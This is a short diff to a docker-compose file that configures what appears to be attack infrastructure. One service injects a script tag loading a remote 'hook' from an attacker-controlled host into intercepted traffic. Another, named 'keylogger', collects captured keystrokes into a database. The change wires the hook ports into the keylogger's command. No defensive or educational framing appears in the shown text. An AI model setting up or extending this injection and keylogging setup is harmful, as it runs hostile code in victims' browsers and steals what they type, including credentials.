@@ -23,8 +23,6 @@ services:
       -H "<script src='https://$HOOK_HOST:$HOOK_PORT_HTTPS/hook' type='text/javascript'></script>" 
       https 0.0.0.0 8443 
       http 0.0.0.0 8080
-      #tcp 0.0.0.0 8080
-      #ssl 0.0.0.0 8443
     network_mode: "host"
     volumes:
       - ./data:/data
@@ -36,7 +34,7 @@ services:
     build:
       context: ./keyloggerServer
     container_name: keylogger
-    command: --db=mongo --hook_host=$HOOK_HOST
+    command: --db=mongo --hook_host=$HOOK_HOST --hook_port_http $HOOK_PORT_HTTP --hook_port_https $HOOK_PORT_HTTPS 
     ports:
       - 8081:80
       - 8445:443  
